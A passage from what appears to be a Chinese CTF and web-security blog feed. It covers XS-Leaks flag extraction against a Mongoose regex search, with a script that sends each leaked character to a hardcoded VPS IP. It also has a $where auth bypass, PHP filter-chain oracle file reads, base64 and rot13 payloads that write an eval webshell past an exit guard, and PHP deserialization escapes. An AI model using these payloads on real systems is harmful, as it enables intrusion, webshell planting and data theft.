page.<span class="title function_">click</span>(<span class="string">&#x27;#submit&#x27;</span>)]); <span class="comment">//admin登录</span></span><br><span class="line">    &#125;(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Starting bot......&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> reports = <span class="keyword">await</span> <span class="title class_">Report</span>.<span class="title function_">find</span>(&#123;&#125;)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Reports length : <span class="subst">$&#123;reports.length&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title class_">Report</span>.<span class="title function_">deleteMany</span>(&#123;&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> report <span class="keyword">of</span> reports) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(report.<span class="property">pack_id</span>)</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">browse</span>(report.<span class="property">pack_id</span>, process.<span class="property">env</span>.<span class="property">SITE_URL</span>)</span><br><span class="line">        &#125;<span class="comment">//会去访问我们report的id页面</span></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">timeout</span>(<span class="variable constant_">TIMEOUT</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//一路追踪,发现sumit中有提交report</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/submit&#x27;</span>, checkAuth, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; pack_id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">checkmd5Regex</span>(pack_id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;submit&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">error</span>: <span class="string">&#x27;Package id must be valid md5 string&#x27;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> report = <span class="keyword">new</span> <span class="title class_">Report</span>(&#123; <span class="attr">pack_id</span>: pack_id &#125;);</span><br><span class="line">        <span class="keyword">await</span> report.<span class="title function_">save</span>();</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;submit&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Package successfully submitted&#x27;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;submit&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Already submit your package&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>至此三大要素齐全,现在就可以细化</p>
<p>模糊查找:</p>
<p>​	在search中我们可以利用pack.description进行搜索,此处可以利用Mongoose 的查询语法特性来进行搜索,如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/packages/list?search[description][$regex]=</span><br><span class="line">相当于传入</span><br><span class="line">&#123;</span><br><span class="line">  search: &#123;</span><br><span class="line">    description: &#123;</span><br><span class="line">      $regex: &quot;test&quot; // 用户传入的正则表达式</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">等效于</span><br><span class="line">Package.find(&#123;</span><br><span class="line">  user_id: &quot;...&quot;,</span><br><span class="line">  $or: [</span><br><span class="line">    undefined,       // name 未定义</span><br><span class="line">    &#123; $regex: &quot;test&quot; &#125; // description 条件</span><br><span class="line">  ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>二元结果:</p>
<p>​	成功200失败404,利用火狐的<code> &lt;object&gt;</code> 标签加载目标 URL，根据 onload 或 onerror 事件判断请求是否成功</p>
<p>脚本如下:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xssbotexp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        vps = <span class="string">&#x27;http://39.107.239.30:80&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-+&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//利用火狐的 &lt;object&gt; 标签加载目标 URL，根据 onload 或 onerror 事件判断请求是否成功</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="title function_">search</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> object = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;object&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                object.<span class="property">data</span> = url;</span></span><br><span class="line"><span class="language-javascript">                object.<span class="property">onload</span> = resolve; <span class="comment">//true</span></span></span><br><span class="line"><span class="language-javascript">                object.<span class="property">onerror</span> = reject; <span class="comment">//false</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(object);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="title function_">exp</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">await</span> <span class="title function_">search</span>(url)</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//(async () =&gt; &#123; ... &#125;)(); 是一个 立即调用的异步函数表达式</span></span></span><br><span class="line"><span class="language-javascript">        (<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> url = <span class="string">`http://localhost:8888/packages/list?search[description][$regex]=^<span class="subst">$&#123;flag&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">while</span> (flag.<span class="title function_">charAt</span>(flag.<span class="property">length</span> - <span class="number">1</span>) !== <span class="string">&quot;&#125;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> ( <span class="keyword">let</span> i <span class="keyword">of</span> chars ) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> ( <span class="title function_">await</span>(<span class="title function_">exp</span>(url + <span class="built_in">escape</span>(i))) ) &#123;</span></span><br><span class="line"><span class="language-javascript">                        url = url + <span class="built_in">escape</span>(i)</span></span><br><span class="line"><span class="language-javascript">                        flag += i</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;vps&#125;</span>/?flag=<span class="subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;   <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>受害者执行:</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span>, <span class="attr">res</span>: <span class="title class_">Response</span>, <span class="attr">next</span>: <span class="title class_">NextFunction</span></span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">session</span> = req.<span class="property">session</span>;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">csrfToken</span> = req.<span class="title function_">csrfToken</span>();</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//防护CSRF 攻击（通过令牌验证）</span></span><br><span class="line"><span class="comment">//XSS 攻击（通过严格的 CSP 策略）</span></span><br><span class="line">- <span class="keyword">default</span>-src <span class="string">&#x27;none&#x27;</span>: 默认禁止加载所有资源（脚本、图片等）。</span><br><span class="line">- style-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;sha256-...&#x27;</span>: 只允许加载同源的 <span class="variable constant_">CSS</span>，且允许特定哈希值的行内样式（可能是关键样式）。</span><br><span class="line">- img-src <span class="string">&#x27;self&#x27;</span>: 只允许加载同源的图片。</span><br><span class="line">- form-action <span class="string">&#x27;self&#x27;</span>: 限制表单只能提交到同源地址。</span><br><span class="line">- base-uri <span class="string">&#x27;none&#x27;</span>: 禁止 &lt;base&gt; 标签修改基础 <span class="variable constant_">URL</span>，防止路径劫持。</span><br><span class="line"><span class="comment">//数据劫持（限制资源加载来源）</span></span><br><span class="line"><span class="comment">//MIME 混淆攻击（禁止类型嗅探）</span></span><br></pre></td></tr></table></figure>

<p>由上文可知,bot在访问id页面的时候,页面的html不会被修改,但由于csp进行了严格限制,我们只能使用重定向到vps上执行代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;2; URL=&#x27;http://**&#x27;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加后记录下md5值,留着submit用</p>
<p>但此时还要绕过&#x2F;auth,这里可以利用mongodb的where查询来污染或者说是劫持mongodb的hex_md5函数</p>
<p>因为where本质上是执行js代码,就可以对hex_md5函数进行覆盖</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/packages/list?search[$where]=hex_md5=function()&#123;return &#x27;5d41402abc4b2a76b9719d911017c592&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>然后再&#x2F;auth处输入md5进行测试通过即可,最后将页面id submit即可成功</p>
<p>参考:</p>
<p><a href="https://aszx87410.github.io/beyond-xss/ch5/xsleaks-2">https://aszx87410.github.io/beyond-xss/ch5/xsleaks-2</a></p>
<p><a href="https://xsleaks.dev/">https://xsleaks.dev/</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>侧信道</tag>
      </tags>
  </entry>
  <entry>
    <title>php filter链</title>
    <url>/2025/06/22/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="基于oracle的文件读取攻击"><a href="#基于oracle的文件读取攻击" class="headerlink" title="基于oracle的文件读取攻击"></a>基于oracle的文件读取攻击</h1><ul>
<li>主体：利用iconvfiler（通过编码切换来引发内存溢出报错），dechunk filter（当一个字符是十六进制中的字符时内容会被丢弃用来筛选字符），再通过编码切换来交换字符串中的字符位置，实现对其他字节的泄密。</li>
<li>具体：</li>
</ul>
<ol>
<li>确定首字节是否是十六进制字符（UTF8.UCS-4LE &amp; dechunk）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$size_bomb</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">13</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$size_bomb</span> .= <span class="string">&quot;convert.iconv.UTF8.UCS-4LE|&quot;</span>;</span><br><span class="line">    <span class="comment">//UCS-4编码使用固定4个字节来表示每个字符,其中UCS-4LE即:使最低有效字节（通常是有效数据）存储在最前面</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;php://filter/dechunk|<span class="subst">$size_bomb</span>/resource=/tmp/test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filter</span>);</span><br><span class="line">$ <span class="keyword">echo</span> <span class="string">&#x27;GSTART&#x27;</span> &gt; /tmp/test</span><br><span class="line">$ php oracle.php </span><br><span class="line">Fatal error: Allowed memory size of <span class="number">134217728</span> bytes <span class="title function_ invoke__">exhausted</span> (tried to allocate <span class="number">117440512</span> bytes) in /tmp/oracle.php on line <span class="number">10</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> <span class="string">&#x27;aSTART&#x27;</span> &gt; /tmp/test</span><br><span class="line">$ php oracle.php</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>交换字节位置（convert.iconv.CSUNICODE.UCS-2BE &amp; convert.iconv.UCS-4LE.10646-1:1993）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//交换前两个字节</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;badcfehg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//逆序每四个字节</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;dcbahgfe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对于第三个字节先r4再r2</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;cdabghef&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>其他字节（base64 &amp; convert.iconv.CSUNICODE.CSUNICODE）<br>在php中对于base64再处理的时候会忽略非法字符(可用于绕过)，因此可以利用编码增加非法字符，再利用r2&#x2F;r4编码将后续字节前移，再处理</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//convert.iconv.CSUNICODE.CSUNICODE将字符串最前端加上0xff0xfe</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;��abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 r4 进行移位</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;ba��fedc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 base64 去掉冗余位</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;bafedQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再次使用 r4 交换位置</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;efab==Qd&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>rot1&#x2F;rot13确定具体字符</li>
<li>工具：<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></li>
</ol>
<p>参考：<a href="https://m1racle-7.github.io/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">https://m1racle-7.github.io/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/</a></p>
<h1 id="cn-ext"><a href="#cn-ext" class="headerlink" title="cn-ext"></a>cn-ext</h1><p>把文件读取升级为rce,用脚本cnext-exploit.py</p>
<p><a href="https://github.com/ambionics/cnext-exploits/">https://github.com/ambionics/cnext-exploits/</a></p>
<h1 id="Bypass-file-put-contents-Exit"><a href="#Bypass-file-put-contents-Exit" class="headerlink" title="Bypass file_put_contents Exit"></a>Bypass file_put_contents Exit</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>原理：利用编码解码，去除字符</li>
<li>payload：<blockquote>
<ul>
<li>base64：<br>txt&#x3D;QPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php<br>&#x2F;&#x2F;把content进行base64解码（去除不合法字符，4个一组解码）后写入shell.php<br>&#x2F;&#x2F;base64decode组成<br>phpe xitQ PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+<blockquote>
<ul>
<li>iconv : php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;5.php</li>
<li>rot13 : php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;shell.php</li>
<li>strip_tags : php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell.php(上传base64编码后的webshell，strip_tags会去除php代码)</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
</li>
</ul>
<p>参考：<br><a href="https://www.cnblogs.com/linuxsec/articles/12684259.html">https://www.cnblogs.com/linuxsec/articles/12684259.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2025/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><h2 id="序列化-反序列化："><a href="#序列化-反序列化：" class="headerlink" title="序列化&amp;反序列化："></a>序列化&amp;反序列化：</h2><ul>
<li>将数据转化成一种可逆的数据结构，方便传输</li>
<li>逆向</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#常见的序列化格式</span></span><br><span class="line"><span class="comment">//数组</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="comment">//a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span></span><br><span class="line"><span class="comment">//以”；分界，&#125;为结尾</span></span><br><span class="line"><span class="comment">//类</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span></span><br><span class="line"><span class="comment">//变量前是protected，会在前面加上\x00*\x00（+3）；private:\x00类名\x00（+2+类名长度）</span></span><br><span class="line"><span class="comment">//直接urlencode(serialize($b)) 输出</span></span><br></pre></td></tr></table></figure>

<h2 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h2><blockquote>
<p>__ wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数<br>__ sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数<br>__ destruct() &#x2F;&#x2F;对象被销毁时触发<br>__ call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__ callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__ get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法<br>__ set() &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__ isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>__ unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>__ toString() &#x2F;&#x2F;把类当作字符串使用时触发<br>__ invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发</p>
</blockquote>
<p>从php7.4.0开始，如果类中同时定义了 __ unserialize()__ 和 __wakeup() __  两个魔术方法，则只有 __unserialize() 方法会生效</p>
<p>PHP 的 <code>preg_match()</code> 要求第二个参数是 string。</p>
<ul>
<li>如果你传进去的是一个对象，PHP 会先尝试把它 <strong>转成字符串</strong>，也就是执行 <code>$object-&gt;__toString()</code></li>
</ul>
<h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="PHP反序列化字符逃逸："><a href="#PHP反序列化字符逃逸：" class="headerlink" title="PHP反序列化字符逃逸："></a>PHP反序列化字符逃逸：</h2><ul>
<li><p>增多：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])))); </span><br></pre></td></tr></table></figure>

<p>计算要逃逸的字符串长度，添加相同数目的可替换字符串,把要替换的位置挤出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="comment">#要逃逸的字符串长度</span></span><br><span class="line"><span class="variable">$extra</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;bad&quot;</span>, <span class="variable">$len</span>); <span class="comment">#根据长度构造字符串</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$extra</span>.<span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=<span 